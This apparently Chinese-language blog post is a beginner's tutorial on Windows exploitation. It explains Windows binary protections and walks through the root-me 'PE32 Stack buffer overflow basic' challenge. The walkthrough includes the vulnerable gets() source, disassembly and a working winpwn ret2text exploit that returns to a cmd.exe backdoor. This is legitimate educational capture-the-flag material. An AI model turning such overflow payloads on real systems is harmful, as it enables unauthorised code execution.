@@ -1,0 +1,369 @@
+<!DOCTYPE html><html lang="en"><head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    <meta name="description" content="首发于：先知社区 一直都感觉win pwn很难所以就没接触过，但是看了一些CVE之后还有ZDI最近公布的一些CVE，发现win/软件上的漏洞占比要比linux上的占比多很多，所以打算从最基础的开始学习。笔者在这win pwn方面纯属小白，如有错误欢迎指正  win pwn初探（一）环境搭建首先笔者给出自己的本机环境和虚拟机环境 本机环境：m1 pro 虚拟机环境：PD 17，Win">
+<meta property="og:type" content="article">
+<meta property="og:title" content="win pwn初探（一）">
+<meta property="og:url" content="http://example.com/2022/11/23/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/index.html">
+<meta property="og:site_name" content="z1r0's blog">
+<meta property="og:description" content="首发于：先知社区 一直都感觉win pwn很难所以就没接触过，但是看了一些CVE之后还有ZDI最近公布的一些CVE，发现win/软件上的漏洞占比要比linux上的占比多很多，所以打算从最基础的开始学习。笔者在这win pwn方面纯属小白，如有错误欢迎指正  win pwn初探（一）环境搭建首先笔者给出自己的本机环境和虚拟机环境 本机环境：m1 pro 虚拟机环境：PD 17，Win">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/11/23/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/1.png">
+<meta property="og:image" content="http://example.com/2022/11/23/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/2.png">
+<meta property="og:image" content="http://example.com/2022/11/23/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/3.png">
+<meta property="article:published_time" content="2022-11-23T02:36:06.000Z">
+<meta property="article:modified_time" content="2022-11-26T11:29:17.959Z">
+<meta property="article:author" content="z1r0">
+<meta property="article:tag" content="win pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/11/23/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>win pwn初探（一）</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/z1r00?tab=repositories">Projects</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022/11/30/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%BA%8C%EF%BC%89/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/10/29/AC10-v3%E8%B7%AF%E7%94%B1%E5%99%A8UART%E8%B0%83%E8%AF%95/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/11/23/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/11/23/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/&amp;text=win pwn初探（一）"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/11/23/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/&amp;title=win pwn初探（一）"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/11/23/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/&amp;is_video=false&amp;description=win pwn初探（一）"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=win pwn初探（一）&amp;body=Check out this article: http://example.com/2022/11/23/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/11/23/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/&amp;title=win pwn初探（一）"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/11/23/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/&amp;title=win pwn初探（一）"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/11/23/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/&amp;title=win pwn初探（一）"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/11/23/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/&amp;title=win pwn初探（一）"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/11/23/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/&amp;name=win pwn初探（一）&amp;description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/11/23/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/&amp;t=win pwn初探（一）"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">win pwn初探（一）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.1.</span> <span class="toc-text">环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85checksec"><span class="toc-number">1.1.1.</span> <span class="toc-text">安装checksec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85winpwn"><span class="toc-number">1.1.2.</span> <span class="toc-text">安装winpwn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85windbg"><span class="toc-number">1.1.3.</span> <span class="toc-text">安装windbg</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#winpwn%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6"><span class="toc-number">1.2.</span> <span class="toc-text">winpwn保护机制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9D%E6%8E%A2%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="toc-number">1.3.</span> <span class="toc-text">初探栈溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#checksec"><span class="toc-number">1.3.1.</span> <span class="toc-text">checksec</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.4.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">1.5.</span> <span class="toc-text">Reference</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        win pwn初探（一）
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+        <span itemprop="name">z1r0</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-11-23T02:36:06.000Z" itemprop="datePublished">2022-11-23</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/study/">study</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/win-pwn/" rel="tag">win pwn</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <font size="3">
+
+<blockquote>
+<p>首发于：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11865">先知社区</a></p>
+<p>一直都感觉win pwn很难所以就没接触过，但是看了一些CVE之后还有ZDI最近公布的一些CVE，发现win/软件上的漏洞占比要比linux上的占比多很多，所以打算从最基础的开始学习。笔者在这win pwn方面纯属小白，如有错误欢迎指正</p>
+</blockquote>
+<h1 id="win-pwn初探（一）"><a href="#win-pwn初探（一）" class="headerlink" title="win pwn初探（一）"></a>win pwn初探（一）</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>首先笔者给出自己的本机环境和虚拟机环境</p>
+<p>本机环境：m1 pro</p>
+<p>虚拟机环境：PD 17，Windows 11 专业版-21H2</p>
+<p>虽然是arm windows但是可以运行x32和x64的程序</p>
+<h3 id="安装checksec"><a href="#安装checksec" class="headerlink" title="安装checksec"></a>安装checksec</h3><p>这里笔者摸索了挺长时间的，winchecksec笔者因为各种各样的环境问题导致没有安装成功，但是笔者找到了一个在win上可以直接checksec的<a target="_blank" rel="noopener" href="https://github.com/Wenzel/checksec.py">github项目</a>，只需要去它的<a target="_blank" rel="noopener" href="https://github.com/Wenzel/checksec.py/releases">releases</a>下载<a target="_blank" rel="noopener" href="https://github.com/Wenzel/checksec.py/releases/download/v0.6.2/checksec.exe">checksec.exe</a>即可。</p>
+<h3 id="安装winpwn"><a href="#安装winpwn" class="headerlink" title="安装winpwn"></a>安装winpwn</h3><p>这个就和linux下的pwntools类似，<a target="_blank" rel="noopener" href="https://github.com/byzero512/winpwn">使用地址</a>，安装的话直接执行以下命令即可</p>
+<ul>
+<li>pip3 install winpwn</li>
+<li>pip3 install pefile</li>
+<li>pip3 install keystone-engine</li>
+<li>pip3 install install capstone</li>
+</ul>
+<p>安装完成之后就可以<code>from winpwn import *</code>了</p>
+<h3 id="安装windbg"><a href="#安装windbg" class="headerlink" title="安装windbg"></a>安装windbg</h3><p>其实可以直接用ollydbg、x32dbg、x64dbg，但是笔者看见很多win上CVE复现都用的是windbg，所以笔者也去装了一个</p>
+<p>直接去windows的store商店搜索windbg，直接点击安装即可</p>
+<p>笔者学到目前为止只用到了上面的这三个工具，后续用到其他的话就继续添加吧</p>
+<h2 id="winpwn保护机制"><a href="#winpwn保护机制" class="headerlink" title="winpwn保护机制"></a>winpwn保护机制</h2><p>win上的保护要比linux上的保护多上很多，这里笔者写了一个测试程序然后使用vs2022 preview默认编译成x64的exe</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> {</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"hello world"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p><code>.\checksec.exe 目标程序</code>就可以看见目标程序的保护机制</p>
+<p><img src="/2022/11/23/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/1.png" alt="1"></p>
+<p>NX：这个在win上其实是DEP，堆栈不可执行保护</p>
+<p>Canary：这个在win上其实是GS，可能这个工具的开发者为了让我们更好理解才写了Canary，但是需要注意的是这个工具的canary检测可能检测不准</p>
+<p>ASLR：通俗讲就是地址随机化，让exe和dll的地址全部随机，所以就有了大名鼎鼎<strong>Heap Spray</strong>（堆喷）利用技术，Heap Spray是在shellcode的前面加上大量的slide code（滑板指令），组成一个注入代码段。然后向系统申请大量内存，并且反复用注入代码段来填充。这样就使得进程的地址空间被大量的注入代码所占据。然后结合其他的漏洞攻击技术控制程序流，使得程序执行到堆上，最终将导致shellcode的执行。</p>
+<p>Dynamic Base：程序编译时可通过/DYNAMICBASE编译选项指示程序是否利用ASLR的功能</p>
+<p>High Entropy VA：如果指定此选项，则当内核将进程的地址空间布局随机化为 ASLR 的一部分时，兼容版本的 Windows 内核可以使用更高的熵。 如果内核使用更高的熵，则可以将更多的地址分配给堆栈和堆等内存区域。 因此，更难猜测特定内存区域的位置。当该选项打开时，当这些模块作为 64 位进程运行时，目标可执行文件和它所依赖的任何模块必须能够处理大于 4 GB 的指针值。</p>
+<p>SEH：结构化异常处理（Structured Exception Handling，简称 SEH）是一种Windows 操作系统对错误或异常提供的处理技术。SEH 是 Windows操作系统的一种系统机制，本身与具体的程序设计语言无关。SEH 为Windows的设计者提供了程序错误或异常的处理途径，使得系统更加健壮</p>
+<p>SafeSEH：为了防止攻击者通过覆盖堆栈上的异常处理函数句柄，从而控制程序执行流程的攻击，在调用异常处理函数之前，对要调用的异常处理函数进行一系列的有效性校验，如果发现异常处理函数不可靠，立即终止异常处理函数的调用。不过SafeSEH需要编译器和系统双重支持，缺少一个则保护能力基本就丧失了</p>
+<p>Force Integrity：强制签名保护</p>
+<p>Control Flow Guard：控制Flow防护 (CFG) 是一项高度优化的平台安全功能，旨在打击内存损坏漏洞。 通过严格限制应用程序可以从何处执行代码，利用漏洞（如缓冲区溢出）执行任意代码会更加困难</p>
+<p>Isolation：隔离保护，默认会开启</p>
+<p>Authenticode：签名保护</p>
+<p>以上是checksec的每个保护机制的简要解释，看到这里可能还会迷迷糊糊的，后续的win pwn文章利用会有绕过这些保护，到时候会详细的解释，包括什么是TIB，TEB等</p>
+<h2 id="初探栈溢出"><a href="#初探栈溢出" class="headerlink" title="初探栈溢出"></a>初探栈溢出</h2><p>这里用比较经典的<code>root-me PE32 - Stack buffer overflow basic</code>win pwn题来上手熟悉一下</p>
+<p><a target="_blank" rel="noopener" href="https://www.root-me.org/zh/%E6%8C%91%E6%88%98/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F-%E7%B3%BB%E7%BB%9F/PE32-Stack-buffer-overflow-basic">题目地址</a>，题目也给出了源码</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFAULT_LEN 16</span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">admin_shell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line">        system(<span class="string">"C:\\Windows\\system32\\cmd.exe"</span>);</span><br><span class="line">}</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line">        <span class="type">char</span> buff[DEFAULT_LEN] = {<span class="number">0</span>};</span><br><span class="line"> </span><br><span class="line">        gets(buff);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; DEFAULT_LEN; i++) {</span><br><span class="line">                buff[i] = <span class="built_in">toupper</span>(buff[i]);</span><br><span class="line">        }</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, buff);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><p>将程序利用scp下载到本地，然后checksec看一下保护机制</p>
+<p><img src="/2022/11/23/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/2.png" alt="1"></p>
+<p>上面显示开了Canary，但是在ida分析的时候是没有开canary的</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">15</span>]; <span class="comment">// [esp+0h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [esp+Fh] [ebp-5h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+10h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  gets(buf);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">16</span>; ++i )</span><br><span class="line">    buf[i] = <span class="built_in">toupper</span>(buf[i]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>笔者修了一下之后ida分析结果最后如上</p>
+<p>这个程序意思就是输入buf，然后把buf的小写字母转换成大写字母最后输出出来，但是gets的话会导致栈溢出漏洞</p>
+<p>现在我们以linux平台下的攻击思路来的话就是一个ret2text，后门地址是0x401000</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00401000</span>                               ;org <span class="number">401000</span>h</span><br><span class="line">.text:<span class="number">00401000</span>                               assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing</span><br><span class="line">.text:<span class="number">00401000</span> <span class="number">55</span>                            push    ebp</span><br><span class="line">.text:<span class="number">00401001</span> <span class="number">8B</span> EC                         mov     ebp, esp</span><br><span class="line">.text:<span class="number">00401003</span> <span class="number">68</span> <span class="number">00</span> B0 <span class="number">41</span> <span class="number">00</span>                push    offset aCWindowsSystem          ; <span class="string">"C:\\Windows\\system32\\cmd.exe"</span></span><br><span class="line">.text:<span class="number">00401008</span> E8 BF <span class="number">2B</span> <span class="number">00</span> <span class="number">00</span>                call    sub_403BCC</span><br><span class="line">.text:<span class="number">00401008</span></span><br><span class="line">.text:<span class="number">0040100</span>D <span class="number">83</span> C4 <span class="number">04</span>                      add     esp, <span class="number">4</span></span><br><span class="line">.text:<span class="number">00401010</span> <span class="number">5</span>D                            pop     ebp</span><br><span class="line">.text:<span class="number">00401011</span> C3                            retn</span><br></pre></td></tr></tbody></table></figure>
+
+<p>ida分析之后发现偏移为0x14，所以<code>payload = b'a' * (0x14 + 4) + p32(0x401000)</code></p>
+<img src="/2022/11/23/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/3.png" alt="1" style="zoom:50%;">
+
+<p>发送过去之后成功的劫持了程序流到后门地址上，成功获取一个shell</p>
+<p>最终exp</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> winpwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.arch=<span class="string">'i386'</span></span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./ch72.exe'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(file_name)</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">'a'</span> * (<span class="number">0x14</span> + <span class="number">4</span>)</span><br><span class="line">payload += p32(<span class="number">0x401000</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">r.sendline(<span class="string">'calc'</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这篇初探文章只是简单的了解了windows下的保护机制，和winpwn的一个用法，后续会学习如何调试，如何绕过这些保护，包括如何用pwntools来写exp</p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a target="_blank" rel="noopener" href="http://blog.chinaunix.net/uid-24917554-id-3492618.html">http://blog.chinaunix.net/uid-24917554-id-3492618.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/4f89f810d98e">https://www.jianshu.com/p/4f89f810d98e</a></p>
+</font>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/z1r00?tab=repositories">Projects</a></li>
+         
+          <li><a href="/links/">links</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">win pwn初探（一）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.1.</span> <span class="toc-text">环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85checksec"><span class="toc-number">1.1.1.</span> <span class="toc-text">安装checksec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85winpwn"><span class="toc-number">1.1.2.</span> <span class="toc-text">安装winpwn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85windbg"><span class="toc-number">1.1.3.</span> <span class="toc-text">安装windbg</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#winpwn%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6"><span class="toc-number">1.2.</span> <span class="toc-text">winpwn保护机制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9D%E6%8E%A2%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="toc-number">1.3.</span> <span class="toc-text">初探栈溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#checksec"><span class="toc-number">1.3.1.</span> <span class="toc-text">checksec</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.4.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">1.5.</span> <span class="toc-text">Reference</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/11/23/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/11/23/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/&amp;text=win pwn初探（一）"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/11/23/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/&amp;title=win pwn初探（一）"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/11/23/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/&amp;is_video=false&amp;description=win pwn初探（一）"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
